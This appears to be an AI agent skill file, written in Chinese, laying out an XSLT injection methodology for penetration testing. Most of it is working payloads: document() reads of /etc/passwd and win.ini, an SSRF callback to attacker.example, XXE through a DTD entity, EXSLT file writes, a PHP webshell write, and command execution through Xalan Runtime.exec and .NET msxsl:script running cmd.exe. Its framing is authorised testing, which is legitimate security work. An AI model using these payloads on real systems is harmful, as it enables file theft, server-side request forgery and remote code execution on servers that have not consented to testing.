---
name: xslt-injection
description: "XSLT 注入测试方法论。当目标存在用户可控的 XSLT/样式表输入、XML 转换端点、报表生成器、XML→HTML 转换器时使用。覆盖处理器指纹识别(Xalan/Saxon/libxslt/MSXML)、XXE via XSLT(DTD外部实体)、document() SSRF/文件读取、EXSLT 文件写入、PHP php:function RCE、Java Saxon/Xalan 扩展 RCE、.NET msxsl:script RCE。完全零覆盖漏洞类型——任何涉及 XSLT、XML 样式表、XML 转换的测试都应使用此 skill"
metadata:
  tags: "XSLT,injection,XML,transform,stylesheet,RCE,XXE,document(),EXSLT,php:function,Saxon,Xalan,msxsl:script"
  category: "exploit"
---

# XSLT 注入测试方法论


XSLT 注入发生在**攻击者可控的 XSLT** 被服务端编译/执行时。关键是先**识别处理器类型**（Java/.NET/PHP/libxslt），再按平台选择攻击路径。

---

## 0. 快速开始

1. **找到注入点**：参数名含 `xslt`, `stylesheet`, `transform`, `template`、SOAP 样式表、报表生成器、XML→HTML 转换器
2. **探测反射**：注入唯一命名空间或 `xsl:value-of select="'marker'"` — 输出变化则确认执行
3. **指纹识别**处理器（§1）
4. **升级攻击**：**document()**（§2）、**XXE**（§3）、**EXSLT 写文件**（§4）、**PHP RCE**（§5）、**Java RCE**（§6）、**.NET RCE**（§7）

**无害探测 payload**：

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:value-of select="'XSLT_PROBE_OK'"/>
  </xsl:template>
</xsl:stylesheet>
```

---

## 1. 处理器指纹识别

使用标准 `system-property` 读取：

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:output method="text"/>
  <xsl:template match="/">
    <xsl:text>vendor=</xsl:text><xsl:value-of select="system-property('xsl:vendor')"/>
    <xsl:text>&#10;version=</xsl:text><xsl:value-of select="system-property('xsl:version')"/>
    <xsl:text>&#10;vendor-url=</xsl:text><xsl:value-of select="system-property('xsl:vendor-url')"/>
  </xsl:template>
</xsl:stylesheet>
```

**指纹对照表**：

| 信号 | 引擎 |
|---|---|
| `Apache Software Foundation` / Xalan 标记 | Xalan（Java） |
| `Saxonica` / Saxon URI | Saxon |
| `libxslt` / GNOME 栈 | libxslt（C，常见于 PHP/nginx） |
| Microsoft URL / MSXML 字符串 | MSXML / .NET XSLT 栈 |

根据结果选择 §5–§7 路径。

---

## 2. 文件读取 — `document()`

`document()` 加载另一个 XML 文档到节点集；本地文件通常按 XML 解析（有噪声），但**错误和部分读取**仍可泄露信息。

**Unix**：
```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:output method="text"/>
  <xsl:template match="/">
    <xsl:copy-of select="document('/etc/passwd')"/>
  </xsl:template>
</xsl:stylesheet>
```

**Windows**：
```xml
<xsl:copy-of select="document('file:///c:/windows/win.ini')"/>
```

**SSRF / 带外**：
```xml
<xsl:copy-of select="document('http://attacker.example/ssrf')"/>
```

如果数据不直接返回客户端，可配合**错误回显**或**时间差**观测。

---

## 3. XXE via XSLT（外部实体）

XSLT 1.0 允许在样式表中使用 **DTD 外部实体**（当解析器允许 DTD 时）：

```xml
<!DOCTYPE xsl:stylesheet [
  <!ENTITY ext_file SYSTEM "file:///etc/passwd">
]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:output method="text"/>
  <xsl:template match="/">
    <xsl:value-of select="'ENTITY_START'"/>
    <xsl:value-of select="&ext_file;"/>
    <xsl:value-of select="'ENTITY_END'"/>
  </xsl:template>
</xsl:stylesheet>
```

加固的解析器会禁用外部 DTD — 此处失败不代表其他 XSLT 向量（§2）不可用。

---

## 4. 文件写入 — EXSLT (`exslt:document`)

当 **EXSLT common** 扩展启用时：

```xml
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:exploit="http://exslt.org/common"
  extension-element-prefixes="exploit">
  <xsl:template match="/">
    <exploit:document href="/tmp/evil.txt" method="text">
      <xsl:text>PROOF_CONTENT</xsl:text>
    </exploit:document>
  </xsl:template>
</xsl:stylesheet>
```

**影响**：在路径权限允许的位置任意写文件 — 常可通过 webroot/cron/包含点实现 **RCE**。

---

## 5. RCE — PHP (`php:function`)

需要 PHP XSLT 启用了 `registerPHPFunctions()` 的场景（应用配置不当）：

```xml
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:php="http://php.net/xsl">
  <xsl:output method="text"/>
  <xsl:template match="/">
    <xsl:value-of select="php:function('readfile','index.php')"/>
  </xsl:template>
</xsl:stylesheet>
```

**目录列表**：
```xml
<xsl:value-of select="php:function('scandir','.')"/>
```

**危险操作**（仅在实验环境验证）：
- `php:function('file_put_contents','/var/www/shell.php','<?php ...')` — Webshell 写入
- `php:function('assert', string($payload))` — 旧版 PHP 代码执行

**注意**：现代 PHP 加固通常**阻止**这些；没有 RCE 不代表 `document()`/XXE 不可用。

---

## 6. RCE — Java（Saxon / Xalan 扩展）

Java 引擎可能暴露映射到静态方法的**扩展函数**。

**Xalan 风格**（概念性 — 根据实际版本和扩展绑定调整）：

```xml
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
  <xsl:template match="/">
    <xsl:variable name="rtobject" select="rt:getRuntime()"/>
    <xsl:value-of select="rt:exec($rtobject,'/bin/sh -c id')"/>
  </xsl:template>
</xsl:stylesheet>
```

**Saxon 风格**：
```
Runtime:exec(Runtime:getRuntime(), 'cmd.exe /C whoami')
```

如果扩展被禁用（常见的安全默认配置），转向 **document()**、SSRF 或其他攻击面。

---

## 7. RCE — .NET (`msxsl:script`)

当 Microsoft XSLT **脚本块**启用时：

```xml
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:msxsl="urn:schemas-microsoft-com:xslt"
    extension-element-prefixes="msxsl">
  <msxsl:script language="C#" implements-prefix="user">
    <![CDATA[
    public string xexec() {
      System.Diagnostics.Process.Start("cmd.exe", "/c whoami");
      return "ok";
    }
    ]]>
  </msxsl:script>
  <xsl:template match="/">
    <xsl:value-of select="user:xexec()"/>
  </xsl:template>
</xsl:stylesheet>
```

默认安全配置通常禁用脚本 — 此路径仅在启用时有效。

---

## 深入参考

- XSLT 高级利用 payload 与引擎特性（XSLT 2.0+/盲利用/WAF 绕过） → [references/xslt-exploitation.md](references/xslt-exploitation.md)

## 8. 决策树

```
用户可控 XSLT 或 XML 转换？
                    |
                   否 → 不在范围
                    |
                   是
                    |
        +-----------+-----------+
        |                       |
   输出反射                   无反射
   注入逻辑？              尝试盲通道
        |                       |
        v                       v
  system-property()        错误/OOB/时间差
  指纹识别引擎                   |
        |                       |
    +---+---+---+           document()
    |       |   |               |
  libxslt Java .NET          SSRF/文件读
    |       |   |               |
 document() Saxon/ msxsl:script? EXSLT?
 EXSLT写   Xalan     |            |
    |     扩展？  C# Process    记录证据
    v       v      v
 文件读/写 rt:exec cmd.exe /c
```

---

## 9. 工具

| 类别 | 工具 |
|---|---|
| 代理/手动 | Burp Suite, OWASP ZAP — 重放样式表 payload，观察响应和错误 |
| XML/XSLT 实验环境 | 匹配目标**完全相同**的处理器（PHP libxslt / Java Saxon 版本 / .NET framework）|
| 带外 | Collaborator / 私有回调服务器用于 `document('http://…')` |

没有通用扫描器能替代**版本特定**的行为验证。
